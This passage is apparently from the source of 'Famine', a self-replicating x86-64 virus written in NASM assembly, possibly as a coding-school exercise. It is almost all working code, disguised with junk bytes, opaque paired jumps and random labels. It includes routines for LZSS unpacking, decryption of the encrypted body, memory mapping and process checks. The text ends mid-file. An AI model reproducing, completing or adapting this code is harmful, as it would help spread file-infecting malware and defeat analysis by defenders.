; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

_signature:
    .start: db "Famine version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 4 db 0x00
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _UEC_OFF
    .mapaddr    resq 0x1
endstruc
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Public Variables.
VARIABLES public
procname:       db "bash", 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@dq4ZgnsKS8kL
..@larSBclb85Jb:
    xor         r3, r3
    js          ..@V2kEVa7gBrjK
    jns         ..@V2kEVa7gBrjK
..@2SyUhXdGcldn:
    test        r2, r2
    jmp         ..@d3uO8jIV31Sz
..@XZhoBpOqIEBt:
    xchg        rax, rax
    jl          ..@RUQsjZdhuXPb
    jge         ..@RUQsjZdhuXPb
..@TtiqegySGIJN:
    mov         rdi, rdi
    jmp         $+4
db 0x55, 0x35
    jmp         $+3
db 0x12
    jmp         $+5
db 0x81, 0xeb, 0x23
    jmp         ..@hMLMwPwoqI8n
..@eM8s4vYMh3iw:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+5
db 0x3c, 0x9c, 0x40
    jmp         ..@rUm6a7dOiRiT
ExitProgram:
    jmp         ..@FRwLkXDer3Qt
..@zgk10gqjckzF:
    xchg        rbx, rbx
    jmp         $+3
db 0xb7
    jl          ..@Bu6u0KSNGQZk
    jge         ..@Bu6u0KSNGQZk
..@1AYoeaSkh856:
    xor         r1, r1
    jmp         $+3
db 0x73
    jb          ..@F0oUVd8E40Mi
    jae         ..@F0oUVd8E40Mi
..@ApvdIab3xlCG:
    sub         rsp, _UEC_OFF_size
    jmp         $+3
db 0x8d
    jmp         $+4
db 0x72, 0xea
    jb          ..@Yq0hjtBth5Vx
    jae         ..@Yq0hjtBth5Vx
..@lVfNxN9vpsoh:
    xor         rbx, rbx
    jmp         ..@D03aNxqu3u28
..@9IYLIiAhAxCV:
    push        rax
    jl          ..@MBot5w3CCZVS
    jge         ..@MBot5w3CCZVS
..@O7GFubfb0kQ2:
    push        rdx
    js          ..@AXrSwt5TwGxT
    jns         ..@AXrSwt5TwGxT
..@FrRxG9O4xH4C:
    xchg        rcx, rcx
    jmp         $+3
db 0xbd
    jmp         $+3
db 0xdf
    jmp         $+4
db 0x9a, 0x50
    jmp         ..@rp5lgphV61yP
..@DYG8g4L84AeX:
    mov         rbx, rbx
    jb          ..@FUeoDoBgsEch
    jae         ..@FUeoDoBgsEch
..@MyRE1HZtee05:
    pop         rbx
    jmp         $+5
db 0x75, 0x95, 0x00
    jmp         $+4
db 0xcc, 0xf9
    jmp         $+4
db 0x5c, 0x1f
    jb          ..@9H0NmIQNf3X8
    jae         ..@9H0NmIQNf3X8
..@sNUacDnUzqxL:
    pop         rsi
    jmp         $+4
db 0xd9, 0x2c
    jl          ..@wtyJUAmSFN9n
    jge         ..@wtyJUAmSFN9n
..@nos0Haltwtjy:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+5
db 0x59, 0x96, 0x37
    jmp         ..@oHKVI0P7U9E5
..@e69TZeB7khp9:
    push        rdx
    jmp         $+4
db 0x7f, 0xb7
    jb          ..@A60zWBANkgHp
    jae         ..@A60zWBANkgHp
..@tlZWo4eD4X6B:
    mov         rcx, 8
    jmp         ..@e0G4abERMnx8
..@V7aWoD3bc8jh:
    call        LzssDecoder
    jl          ..@2sSeTMXCtCO3
    jge         ..@2sSeTMXCtCO3
..@MdWhTqXmE3QD:
    xchg        rbx, rbx
    jb          ..@XkDOo74aY9lN
    jae         ..@XkDOo74aY9lN
..@JKUf8FyvmOkR:
    add         rdi, bytes
    jb          ..@wMvYtAwCVPrd
    jae         ..@wMvYtAwCVPrd
..@PmIpzl4nwaep:
    pop         rcx
    jmp         $+4
db 0x68, 0x9b
    jmp         $+5
db 0x76, 0x82, 0xf0
    jl          ..@sRhgQ6Op0t3i
    jge         ..@sRhgQ6Op0t3i
..@vfGWiazjLlVw:
    pop         rax
    js          ..@8ViMaI36YpmZ
    jns         ..@8ViMaI36YpmZ
..@IHEYg7ODV6Pk:
    je          ..@mb5pgfiDzYKN
    je          ..@ZOd7eE4Yn4o6
    jne         ..@ZOd7eE4Yn4o6
..@hK8axw6UUlGf:
    jg          ..@L8bdoGYBs4sL
    jl          ..@afVrrhkG9A7q
    jge         ..@afVrrhkG9A7q
..@ziqKULHapxuP:
    xchg        rdi, rdi
    jmp         ..@DyTjlFGg0NHK
..@3583zAnxJkau:
    ret
    jmp         $+3
db 0xf4
    jb          ..@vXh5jIL6Ry9g
    jae         ..@vXh5jIL6Ry9g
..@AqaEsjVz17RX:
    rep         nop
    jmp         ..@b2y5lS4ZZi13
..@L5wMAT5M0DCQ:
    push        rsi
    jmp         $+3
db 0xba
    jmp         $+3
db 0x93
    jmp         $+5
db 0x0b, 0xac, 0xe3
    jmp         ..@P0EiJ7HuKchT
..@oAWrvKpuoyPk:
    sub         QWORD [rsp+2*bytes], rdx
    js          ..@PuXEj1Q5psbJ
    jns         ..@PuXEj1Q5psbJ
..@J7lFKyIT0w4m:
    mov         rsp, rsp
    jl          ..@N9c4GEKXM5me
    jge         ..@N9c4GEKXM5me
..@3G45vTvFgLoM:
    mov         rsp, rsp
    jmp         $+3
db 0x63
    jmp         ..@9EneUm92s2X2
..@hfOTBwpA619i:
    VAR         public, _start
    jb          ..@RLEGoZT4IHDH
    jae         ..@RLEGoZT4IHDH
..@LOWe1TM2t4ug:
    jmp         ..@lUMJQ26U5wUM
    jmp         $+4
db 0xb2, 0xa7
    jmp         ..@mS4CpCNGIihx
..@5FZFUKlFQtWq:
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         ..@Qn8atMm9neCY
..@pTjif6kuOQZY:
    mov         rax, rax
    jmp         $+5
db 0x49, 0x44, 0x4f
    jb          ..@ObASBILwTqIj
    jae         ..@ObASBILwTqIj
..@1hER72glVPKf:
    push        rsi
    jmp         $+3
db 0x26
    jmp         ..@EtRFBJeJmanI
..@y5ahZAUR6pea:
    push        rsi
    jmp         ..@sNUacDnUzqxL
..@xj4cQocajzxE:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0x92
    js          ..@P4Hq1myhF4vb
    jns         ..@P4Hq1myhF4vb
..@TNxk7Ve13J6k:
    push        rsi
    jmp         $+4
db 0xe9, 0xaa
    jmp         $+5
db 0xe7, 0x53, 0x0d
    jmp         $+5
db 0x7f, 0x60, 0x9b
    jmp         $+5
db 0xab, 0x22, 0xa8
    jmp         $+3
db 0x4e
    jmp         $+5
db 0x97, 0xf7, 0xe4
    jmp         ..@aRp1NyfYPt4v
..@sJcLPppENnJK:
    mov         dl, BYTE [rbx]
    jb          ..@rNe4FpK13nxq
    jae         ..@rNe4FpK13nxq
..@7fAKdOWdIlSr:
    push        rdi
    jb          ..@n0msUhvC35cv
    jae         ..@n0msUhvC35cv
..@ikXcHwDxHJXE:
    mov         rdx, rdx
    jmp         $+3
db 0x2f
    je          ..@EbgiMxLuaolP
    jne         ..@EbgiMxLuaolP
..@sRhgQ6Op0t3i:
    push        rax
    jmp         $+4
db 0xdd, 0xa8
    jb          ..@vRniKN1h9HW8
    jae         ..@vRniKN1h9HW8
..@WKvc0esB3jfX:
    mov         r2d, DWORD [r5]
    jb          ..@nR786uBldcvt
    jae         ..@nR786uBldcvt
..@CsqV71mQxgGj:
    push        rcx
    jmp         ..@DdAPM5kzoGiW
..@JE5ht9VrgHh3:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         ..@DlgNVRyFDJdT
..@6IeUXUbRVjV1:
    xchg        rsi, rsi
    jmp         $+3
db 0x7b
    jmp         ..@AqaEsjVz17RX
..@PxZ9VMQRunYF:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    jmp         ..@DsbIQOT0sO2j
..@s1FYVXTudbWQ:
    xor         r2, r2
    je          ..@PF8rHAKPDSVh
    jne         ..@PF8rHAKPDSVh
..@CJzV2SKpQ6ft:
    xchg        rcx, rcx
    js          ..@mb5pgfiDzYKN
    jns         ..@mb5pgfiDzYKN
..@ObASBILwTqIj:
    mov         m8, rax
    jmp         $+4
db 0xb9, 0x91
    jmp         ..@0L24pyaeSHL5
..@HmRQgQO86c7E:
%ifdef X86_32
    xor         ebp, ebp
%endif
    js          ..@P5NlliboZt61
    jns         ..@P5NlliboZt61
Strlen:
    jmp         ..@a41Je5byOGES
..@rfHiF4VgMo5B:
    cmp         BYTE [r1 + rax], 0x0
    jmp         $+3
db 0x9c
    js          ..@454RyWBnBTVO
    jns         ..@454RyWBnBTVO
..@A8OcF6wahAV0:
    xchg        rbx, rbx
    jb          ..@H3SvkqBOwhG2
    jae         ..@H3SvkqBOwhG2
..@AXrSwt5TwGxT:
    pop         rdx
    jmp         $+5
db 0xe7, 0x8b, 0x63
    js          ..@3nOIIEgfLwsD
    jns         ..@3nOIIEgfLwsD
..@TUgcclSKV0ul:
    mov         rdx, rdx
    jmp         $+5
db 0x45, 0x3a, 0x16
    js          ..@u8iBPFNbo4JA
    jns         ..@u8iBPFNbo4JA
..@K83OZlHNwl8a:
    mov         rax, SYS_EXIT
    jmp         ..@fSOhaNNpmH8X
..@zpwMIVFZdjrM:
    mov         rsi, rsi
    js          ..@q57UTayp6TLQ
    jns         ..@q57UTayp6TLQ
..@FUeoDoBgsEch:
    xchg        rbx, rbx
    jmp         $+4
db 0x99, 0x92
    jl          ..@jMCMwQe7wsFa
    jge         ..@jMCMwQe7wsFa
..@ZiNqKpwr64BH:
    xor         rax, rax
    jmp         $+4
db 0xdb, 0x69
    jmp         ..@6IeUXUbRVjV1
..@0XWHMZCuNAZ6:
    push        rsi
    jmp         ..@nocAZpraMNph
..@lXtcJW7ck6lB:
    push        rdx
    jl          ..@dygxEEvXkF8z
    jge         ..@dygxEEvXkF8z
..@kHBPPEUcEI6j:
    mov         rdx, rdx
    jmp         $+3
db 0xdb
    jmp         ..@tCxvBHeAtIsv
..@3ExdNzbKrodV:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    je          ..@JE1ATWFVMIay
    jne         ..@JE1ATWFVMIay
..@xVvnfkEOzNlN:
    pop         rbx
    js          ..@bFzpW4YPGTLP
    jns         ..@bFzpW4YPGTLP
..@3diCSPWTEfxz:
%ifdef X86_32
    mov         edx, 111b
%endif
    jmp         ..@aWV4sUhsBwzy
..@NJjzwuWyg9vN:
    mov         r2, QWORD [r4]
    js          ..@2SyUhXdGcldn
    jns         ..@2SyUhXdGcldn
..@w1A6X7bfeR4W:
    jnz         ..@7twvrPz4ZgZf
    jmp         $+5
db 0x69, 0x04, 0x59
    jmp         $+5
db 0x2f, 0xc2, 0x2e
    js          ..@ZiNqKpwr64BH
    jns         ..@ZiNqKpwr64BH
..@t9fsm2ezsTU0:
    sub         r1, QWORD [r5]
    jmp         $+3
db 0x3a
    jl          ..@SEOPse63GHQa
    jge         ..@SEOPse63GHQa
..@nAkocuGOJH1g:
    mov         rbx, rbx
    jmp         $+3
db 0xab
    js          DecryptExecutableCode
    jns         DecryptExecutableCode
..@eSlbApZo3JsQ:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+3
db 0xd2
    jmp         $+3
db 0x03
    jmp         $+4
db 0xeb, 0x1b
    jmp         ..@8TwWYOk6Co5C
..@KoLfE9GdTHrp:
    ret
    je          GetEnv
    jne         GetEnv
..@PF8rHAKPDSVh:
    push        rdi
    jmp         ..@bhtbiuaYvn4P
..@GRu3nkHaTv95:
    pop         rcx
    jmp         $+4
db 0x99, 0x0a
    jmp         ..@5FZFUKlFQtWq
..@34sUMkYCVUuA:
    push        r3
    jmp         $+3
db 0x33
    jmp         $+5
db 0x51, 0x77, 0x87
    jmp         $+5
db 0x49, 0x35, 0x64
    jmp         $+4
db 0x56, 0xd7
    jmp         $+3
db 0x0d
    js          ..@4M8rclpgB1zf
    jns         ..@4M8rclpgB1zf
..@ao4y2Fe4SRoE:
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jmp         $+5
db 0xaa, 0xe9, 0x68
    jmp         $+4
db 0xb1, 0x6c
    jb          ..@eSlbApZo3JsQ
    jae         ..@eSlbApZo3JsQ
..@rfTrUpnQy0YG:
    xchg        rdi, rdi
    jmp         ..@RU3XxFkCYQIy
..@5SFFMlr83OkB:
    ret
    jmp         $+5
db 0x05, 0x2c, 0xd9
    jmp         ..@JGqfAooFG3Ta
..@ZNs1O6IDfCOx:
    call        ..@u8iBPFNbo4JA
    jmp         ..@vHydLlB8jPHG
..@FxODytXWxZpa:
    pop         rdi
    jmp         $+4
db 0xba, 0x36
    js          ..@cQY0enSdnfq2
    jns         ..@cQY0enSdnfq2
..@IQwWSs78fJto:
    mov         rbx, rbx
    jmp         $+4
db 0x74, 0x97
    jmp         ..@qOt6wZmGo3H3
..@anfTpBTCNTbv:
    and         bx, WINDOW_LENGTH-1
    jmp         $+3
db 0xf9
    jmp         ..@H9TKj7FleQUW
..@uEAZsAezPcLC:
    jz          ..@Xv6ACzy2Mq8G
    js          ..@tlZWo4eD4X6B
    jns         ..@tlZWo4eD4X6B
..@bhtbiuaYvn4P:
    push        rdx
    jmp         ..@IXJt8pJW5PNK
..@Ym4L7oGJUFn2:
    add         r4, bytes
    jmp         $+5
db 0x8a, 0x5e, 0xae
    jmp         ..@qF1ft0RKlqdE
..@oKZeAIG9zeKG:
    jmp         ..@rfHiF4VgMo5B
    jmp         $+4
db 0xee, 0x7b
    js          ..@FH6luOe8OwyB
    jns         ..@FH6luOe8OwyB
..@MERZgoSTXHzW:
    add         bx, cx
    js          ..@Y8tX9Oh21NoA
    jns         ..@Y8tX9Oh21NoA
..@IXJt8pJW5PNK:
    pop         rdx
    jmp         ..@aiil8DTisKHY
..@CwNMVS94TzV8:
    pop         rsi
    jb          ..@gT7GOeta5MNm
    jae         ..@gT7GOeta5MNm
..@FVKyLdcKIKJI:
    jmp         ..@6IeUXUbRVjV1
    jmp         $+3
db 0x01
    jmp         $+5
db 0xeb, 0x7c, 0xb3
    jl          ..@1Azdswq1ovvo
    jge         ..@1Azdswq1ovvo
..@BBLTz6nEFBGp:
    cmp         QWORD [rsp+2*bytes], rcx
    jmp         $+3
db 0x3e
    jmp         $+3
db 0xb5
    jmp         $+5
db 0x5b, 0x69, 0xac
    jmp         ..@TfaS6j7Vu8n0
..@gft53sH9Qf6o:
%ifdef X86_64
    mov         edx, 111b
%endif
    jmp         $+5
db 0xb2, 0xe8, 0x7c
    jl          ..@zZoqOv3fCmkd
    jge         ..@zZoqOv3fCmkd
..@sCmZCYjbI6EJ:
    mov         r1, r5
    jmp         $+5
db 0x7d, 0x7c, 0xac
    js          ..@6HwFi1yQVWhT
    jns         ..@6HwFi1yQVWhT
..@2sSeTMXCtCO3:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+4
db 0xd0, 0x5d
    jmp         ..@lBUOIC3I4VwX
..@1Ytx7VkzwSeM:
    pop         rcx
    je          ..@W2AVuBDpd0Xv
    jne         ..@W2AVuBDpd0Xv
..@FRwLkXDer3Qt:
    DESTROY_MX_VAR
    jmp         ..@K83OZlHNwl8a
..@n0msUhvC35cv:
    pop         rdi
    jmp         $+3
db 0xe7
    jmp         ..@ZKq9N6gVlonO
..@gaoPwe18Z7Hj:
    xor         rax, rax
    jmp         $+5
db 0x0c, 0xb7, 0x01
    jmp         $+3
db 0xa8
    jmp         ..@7twvrPz4ZgZf
..@hMLMwPwoqI8n:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         $+4
db 0x66, 0x2d
    jl          ..@1kMjc2y5tftW
    jge         ..@1kMjc2y5tftW
..@QEE2zpocrizz:
    xchg        rdx, rdx
    jl          ..@RHSSIsRBpNlv
    jge         ..@RHSSIsRBpNlv
..@g0YUYv5f9eLJ:
    xchg        rcx, rcx
    jmp         $+5
db 0xb0, 0x8c, 0xd0
    jmp         $+5
db 0xb8, 0x02, 0x68
    jb          ..@mwHFK81XzWfM
    jae         ..@mwHFK81XzWfM
..@V2kEVa7gBrjK:
%ifdef X86_32
    mov         rbp, rbp
%endif
    jmp         $+4
db 0x7c, 0x3c
    jl          ..@0jG9oYiKYSW1
    jge         ..@0jG9oYiKYSW1
..@d3uO8jIV31Sz:
    mov         rsi, rsi
    jl          ..@twxa6qx8Itby
    jge         ..@twxa6qx8Itby
..@Ny0CTryciqJe:
    je          ..@1Azdswq1ovvo
    jmp         $+4
db 0x8f, 0x7f
    jb          ..@zgk10gqjckzF
    jae         ..@zgk10gqjckzF
..@kk5Y3wAnQB2Y:
    push        rsi
    jmp         ..@AeSxpVJqQGBg
..@B2fam27EgTDP:
    sub         ecx, 1
    jmp         $+3
db 0x13
    jmp         ..@E2Cq7DXMh7eH
..@ueIN3AyfxT37:
    add         rdi, bytes
    jb          ..@iqqrzpyGiWIx
    jae         ..@iqqrzpyGiWIx
..@dCV6Xt02ri3j:
    xor         r1, r1
    jmp         $+5
db 0x3d, 0x3e, 0x6e
    jmp         ..@ONE7poCgxt16
..@8XOwQMTzrr7F:
%ifdef X86_64
    xor         r9, r9
%endif
    jl          ..@HGi7T06mgTw9
    jge         ..@HGi7T06mgTw9
..@aN2dJtwC5gjG:
    GGLOBAL     virus_len
    jmp         $+5
db 0x7e, 0xbe, 0x19
    je          ..@CRrUV5naNhp3
    jne         ..@CRrUV5naNhp3
..@P0EiJ7HuKchT:
    pop         rsi
    jmp         $+4
db 0x35, 0x94
    jmp         $+3
db 0x00
    jmp         $+3
db 0xb9
    jmp         $+3
db 0x3a
    jmp         ..@lypbC3OW8IsH
..@MBot5w3CCZVS:
    pop         rax
    jmp         $+4
db 0x38, 0x16
    jmp         $+5
db 0xd5, 0x1d, 0x53
    jmp         $+4
db 0x03, 0xcf
    jmp         $+4
db 0xa7, 0xb9
    jl          ..@Gg9QbMtOT5FW
    jge         ..@Gg9QbMtOT5FW
LzssDecoder:
    jmp         ..@0XWHMZCuNAZ6
..@oHKVI0P7U9E5:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jl          ..@FrRxG9O4xH4C
    jge         ..@FrRxG9O4xH4C
..@ExFQi9zRet3x:
    shl         eax, 1
    jmp         $+5
db 0x8e, 0x75, 0x3d
    jb          ..@Cjzuw5r925Zj
    jae         ..@Cjzuw5r925Zj
..@rNotIrzmuWLd:
    mov         rdi, rdi
    jmp         $+5
db 0x1c, 0x70, 0x2b
    jmp         ..@yk4uotmDpYPb
..@WXmWHDWPiLse:
    mov         rsp, rsp
    jmp         $+4
db 0x74, 0x5d
    jmp         $+5
db 0x3d, 0x32, 0xb3
    jl          ..@Ev58B2cFn0V6
    jge         ..@Ev58B2cFn0V6
..@jCbbz3h3qfpk:
    pop         rdx
    js          ..@N3w1zFQ6gWJM
    jns         ..@N3w1zFQ6gWJM
..@0jG9oYiKYSW1:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
%endif
    je          ..@3diCSPWTEfxz
    jne         ..@3diCSPWTEfxz
..@q57UTayp6TLQ:
    mov         rbx, rbx
    jl          ..@dTLXHhFGWBbo
    jge         ..@dTLXHhFGWBbo
..@L8bdoGYBs4sL:
    push        rdx
    jl          ..@cMdAVOWoU5QI
    jge         ..@cMdAVOWoU5QI
..@2ofygtZbSFaB:
    mov         r1, QWORD [rsp]
    jmp         $+5
db 0x7f, 0xe5, 0x67
    jmp         $+4
db 0x91, 0x5b
    je          ..@NJjzwuWyg9vN
    jne         ..@NJjzwuWyg9vN
DecryptExecutableCode:
    jmp         ..@YnwXLSQ8c9uC
..@vRniKN1h9HW8:
    push        rcx
    js          ..@1Ytx7VkzwSeM
    jns         ..@1Ytx7VkzwSeM
..@tBjL8p9mw6JE:
    pop         rsi
    js          ..@dCV6Xt02ri3j
    jns         ..@dCV6Xt02ri3j
..@jMCMwQe7wsFa:
    mov         rbp, rbp
    jmp         $+4
db 0x08, 0xdf
    jl          ..@xbizjNWyp8m2
    jge         ..@xbizjNWyp8m2
..@enWOBFpj9919:
    cmp         QWORD [rdi], 0x00
    jmp         $+4
db 0xf6, 0x33
    jb          ..@Gsa4HsoBEjj8
    jae         ..@Gsa4HsoBEjj8
..@PS8qNFwRVTgx:
    mov         rax, SYS_MUNMAP
    jmp         $+5
db 0x5f, 0x80, 0x6f
    jmp         $+3
db 0x40
    jmp         ..@lPCBJi1jV9HP
..@12ECFe0mRY6V:
    push        rdi
    jmp         $+5
db 0x21, 0x3c, 0x95
    jmp         ..@FxODytXWxZpa
..@rbVw5MPI8lmS:
    rep         nop
    jmp         $+5
db 0xa3, 0xf6, 0x66
    js          ..@e69TZeB7khp9
    jns         ..@e69TZeB7khp9
..@LxBrv5coBIzZ:
    xor         rax, rax
    jmp         $+4
db 0x1c, 0x75
    jb          ..@VLAJNSRM4TrV
    jae         ..@VLAJNSRM4TrV
..@k8AJSXHH98EC:
    mov         rdi, rdi
    jmp         ..@GRu3nkHaTv95
..@1CCycREYpSLF:
    xchg        rcx, rcx
    jmp         $+5
db 0x8d, 0x74, 0x6f
    jmp         ..@hfOTBwpA619i
..@rUm6a7dOiRiT:
    mov         rbx, rbx
    jmp         $+5
db 0xe5, 0x74, 0x7e
    jmp         ..@nos0Haltwtjy
..@DdCLJQeMC9JM:
    xor         r5, r5
    jmp         $+3
db 0xce
    jb          ..@dneE85P8yf1H
    jae         ..@dneE85P8yf1H
..@dq4ZgnsKS8kL:
    pop         rdi
    jmp         $+5
db 0x1f, 0x93, 0x2f
    js          ..@LbEwI7YUghOF
    jns         ..@LbEwI7YUghOF
..@Gg9QbMtOT5FW:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    jb          ..@rY05z45JDsDI
    jae         ..@rY05z45JDsDI
..@xp9Zw3kyAJHZ:
    jne         ..@Cuq1dsk1Fw85
    jl          ..@rGAPRoO59VlU
    jge         ..@rGAPRoO59VlU
..@InVOFomqH8NZ:
    xor         rdi, rdi
    jmp         $+4
db 0xe7, 0x21
    jmp         $+4
db 0x71, 0x82
    jmp         $+5
db 0x2d, 0x62, 0x76
    js          ..@pbnKmO8RFSjm
    jns         ..@pbnKmO8RFSjm
..@6qKD7AUt57dD:
    or          eax, 1
    je          ..@vmjj7ypcRmPX
    jne         ..@vmjj7ypcRmPX
..@6HwFi1yQVWhT:
    xchg        rsp, rsp
    je          ..@aN2dJtwC5gjG
    jne         ..@aN2dJtwC5gjG
..@7YsBXoYWA3ye:
    jle         ..@kKFYsfpbFTPt
    jmp         $+3
db 0x57
    js          ..@lUMJQ26U5wUM
    jns         ..@lUMJQ26U5wUM
..@A60zWBANkgHp:
    pop         rdx
    jmp         ..@0h66SsY5yiYX
..@K6MWlDIaqYRH:
    xor         rcx, rcx
    jmp         $+4
db 0x51, 0xa0
    jb          ..@kaeogLLxnJSb
    jae         ..@kaeogLLxnJSb
..@hYorg7CHtqV1:
    xchg        rsi, rsi
    jmp         $+5
db 0x93, 0xd5, 0x90
    jl          ..@ws7sY77POCum
    jge         ..@ws7sY77POCum
..@lBUOIC3I4VwX:
    xchg        rsi, rsi
    jmp         $+3
db 0xad
    jmp         $+4
db 0x85, 0xc4
    jmp         ..@pTjif6kuOQZY
..@v9C8KTvn8VEC:
    push        rcx
    jmp         $+3
db 0x81
    js          ..@FLi7RV5Oq2AZ
    jns         ..@FLi7RV5Oq2AZ
..@7ZqPs9frHcU7:
    add         r2, 1
    jl          ..@YI8KB48ONFq9
    jge         ..@YI8KB48ONFq9
..@v0ZGA9LAqJrc:
    sub         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0xfb, 0xa5, 0x93
    jmp         $+3
db 0x09
    jb          ..@mW1H70bupD5O
    jae         ..@mW1H70bupD5O
..@tCxvBHeAtIsv:
    push        rbx
    je          ..@xVvnfkEOzNlN
    jne         ..@xVvnfkEOzNlN
..@Ev58B2cFn0V6:
    push        r3
    jmp         $+5
db 0x89, 0x9c, 0x8b
    jb          ..@E9jX6bja7V4O
    jae         ..@E9jX6bja7V4O
..@aDNpBBHLsGGn:
    test        dl, dl
    jmp         ..@L5wMAT5M0DCQ
..@KHH3ECFdGWSH:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jl          ..@IQwWSs78fJto
    jge         ..@IQwWSs78fJto
..@uo5TM8yeNcEV:
    call        ..@u8iBPFNbo4JA
    jmp         $+3
db 0x42
    jmp         $+3
db 0x9b
    jmp         ..@y5ahZAUR6pea
..@pcLt9P2yhc4Z:
    call        ..@u8iBPFNbo4JA
    je          ..@rQOKxkdbisfH
    jne         ..@rQOKxkdbisfH
..@fiYjkfR90fPm:
    VAR         public, entrypoint
    jb          ..@CsqV71mQxgGj
    jae         ..@CsqV71mQxgGj
..@hTqNdCIYTF9n:
    xchg        rdx, rdx
    jmp         $+3
db 0xd0
    jb          ..@0KvhjAxWucqW
    jae         ..@0KvhjAxWucqW
..@4SDLTetGuc5Z:
    push        r2
    jmp         ..@34sUMkYCVUuA
..@bPvhiASGShZo:
    rep         nop
    jmp         $+3
db 0x27
    jmp         $+3
db 0x94
    jmp         $+3
db 0xb3
    jmp         $+3
db 0x44
    jmp         ..@mytIejAYffy1
..@aWV4sUhsBwzy:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jb          ..@ShGy8m0BOgNq
    jae         ..@ShGy8m0BOgNq
..@XKHLM5P7Yipt:
    syscall
    jmp         ..@wyVPMdZm9tkk
..@wyVPMdZm9tkk:
    cmp         eax, 0x0
    jmp         $+3
db 0xa5
    jb          ..@bPvhiASGShZo
    jae         ..@bPvhiASGShZo
..@NPfwCtHrtnLR:
    push        r2
    je          ..@iQ5r4Q9oKO4d
    jne         ..@iQ5r4Q9oKO4d
..@uivpVT2gLdxj:
    mov         rax, 0x20
    jmp         $+3
db 0xdb
    jmp         ..@1QitokaQQN7C
..@zNwnlrVu0pNy:
    rep         cmpsb
    jmp         $+4
db 0xef, 0xe8
    jb          ..@v9C8KTvn8VEC
    jae         ..@v9C8KTvn8VEC
..@zZoqOv3fCmkd:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jmp         $+5
db 0xed, 0x43, 0xfb
    jmp         $+5
db 0xbe, 0x34, 0xba
    jmp         $+4
db 0x1b, 0x0f
    jmp         ..@koNQFHZwuQzx
..@FMqvJLBb7WHJ:
    push        r1
    js          ..@dXu6mjtiVpRq
    jns         ..@dXu6mjtiVpRq
..@SEOPse63GHQa:
    DESTROY_MX_VAR
    jmp         $+3
db 0xe1
    jmp         $+3
db 0xc2
    jmp         ..@KAa8PGcGOF8A
..@mXSrf9Bun6oY:
    mov         vsp, rdi
    jmp         $+4
db 0x42, 0x4a
    jmp         $+3
db 0x35
    jl          ..@TgZu0W2BdXFQ
    jge         ..@TgZu0W2BdXFQ
..@rQOKxkdbisfH:
    xor         rdi, rdi
    jl          ..@TtiqegySGIJN
    jge         ..@TtiqegySGIJN
..@LgQ5MhtKMzRp:
    mov         rcx, rcx
    jmp         $+4
db 0xe7, 0x4b
    jmp         $+5
db 0xb7, 0x26, 0xb1
    jmp         $+4
db 0x71, 0xcf
    jl          ..@pzunfQIz5u4T
    jge         ..@pzunfQIz5u4T
..@lypbC3OW8IsH:
    rep         nop
    jl          ..@mvdk8qBYoNG5
    jge         ..@mvdk8qBYoNG5
..@Irn6Ub8lPvTk:
    pop         rdx
    jmp         $+5
db 0x1b, 0x99, 0x01
    jb          ..@rfHiF4VgMo5B
    jae         ..@rfHiF4VgMo5B
..@3XCjsy31Bqef:
    mov         rsi, rsi
    jmp         ..@anfTpBTCNTbv
..@ec62ur0toYYM:
    jz          ..@jzLuEGNtm9lS
    jmp         ..@1CCycREYpSLF
..@zPcS4PQZKWjW:
    mov         rcx, POSITION_BITS
    jb          ..@TgYpWe5tZZ4V
    jae         ..@TgYpWe5tZZ4V
..@L3zjTWGr7QKG:
    xchg        rsi, rsi
    jmp         $+4
db 0xff, 0xa5
    jmp         ..@r4AJJVNfYKO0
..@dTLXHhFGWBbo:
    mov         BYTE [rbx], al
    jmp         $+3
db 0xfe
    jl          ..@fqMIZBeNEkph
    jge         ..@fqMIZBeNEkph
..@d4MRMUCNCZ5m:
    xchg        rdx, rdx
    je          ..@Z1qSgjyzZwYf
    jne         ..@Z1qSgjyzZwYf
..@4M8rclpgB1zf:
    push        r4
    jmp         $+4
db 0xfe, 0x14
    jmp         $+3
db 0xc7
    jmp         $+4
db 0x14, 0x25
    jmp         $+4
db 0x9e, 0x5e
    jmp         $+5
db 0x54, 0x45, 0x1b
    je          ..@dtvYTy7W3x0N
    jne         ..@dtvYTy7W3x0N
..@44q2JvE8iIrP:
    cmp         cl, dl
    jl          ..@7YsBXoYWA3ye
    jge         ..@7YsBXoYWA3ye
..@mW1H70bupD5O:
